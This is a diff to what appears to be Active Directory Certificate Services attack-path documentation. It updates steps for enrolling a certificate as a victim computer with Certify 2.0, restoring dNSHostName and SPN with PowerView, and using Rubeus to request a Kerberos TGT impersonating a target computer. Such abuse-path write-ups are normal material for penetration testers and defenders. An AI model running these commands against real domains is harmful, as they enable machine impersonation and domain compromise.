@@ -62,19 +62,14 @@ There are several options for this step. You can obtain a session as SYSTEM on t
 
 Step 5: Enroll certificate as victim.
 
-Use Certify as the victim computer to request enrollment in the affected template, specifying the affected EnterpriseCA:
+Use Certify (2.0) as the victim computer to request enrollment in the affected template, specifying the affected EnterpriseCA:
 
 ```bash
-Certify.exe request /ca:SERVERCA-NAME /template:TEMPLATE /machine
+Certify.exe request --ca SERVER\CA-NAME --template TEMPLATE --machine
 ```
-Save the certificate as `cert.pem` and the private key as `cert.key`.
+The certificate PFX is printed to the console in a base64-encoded format.
 
-Step 6: Convert the emitted certificate to PFX format:
-
-```bash
-certutil.exe -MergePFX .\cert.pem .\cert.pfx
-```
-Step 7 (optional): Set `dNSHostName` and SPN of victim to the previous values.
+Step 6 (optional): Set `dNSHostName` and SPN of victim to the previous values.
 
 To avoid issues in the environment, set the `dNSHostName` and SPN of the victim computer back to its previous values using PowerView:
 
@@ -85,13 +80,12 @@ Set-DomainObject -Identity VICTIM -Set @{'dnshostname'='victim.corp.local'}
 Set-DomainObject -Identity VICTIM -Set @{'serviceprincipalname'='HOST/victim'}
 ```
 
-Step 8: Perform Kerberos authentication as targeted computer against affected DC using certificate.
+Step 7: Perform Kerberos authentication as targeted computer against affected DC using certificate.
 
-Use Rubeus to request a ticket granting ticket (TGT) from an affected DC, specifying the
-target identity to impersonate and the PFX-formatted certificate created in Step 6:
+Use Rubeus to request a ticket granting ticket (TGT) from an affected DC, specifying the target identity to impersonate and the base64-encoded certificate obtained in Step 5:
 
 ```bash
-Rubeus.exe asktgt /certificate:cert.pfx /user:TARGET$ /domain:DOMAIN /dc:DOMAIN_CONTROLLER
+Rubeus.exe asktgt /certificate:<cert base64> /user:TARGET$ /domain:DOMAIN /dc:DOMAIN_CONTROLLER
 ```
 
 ### Linux
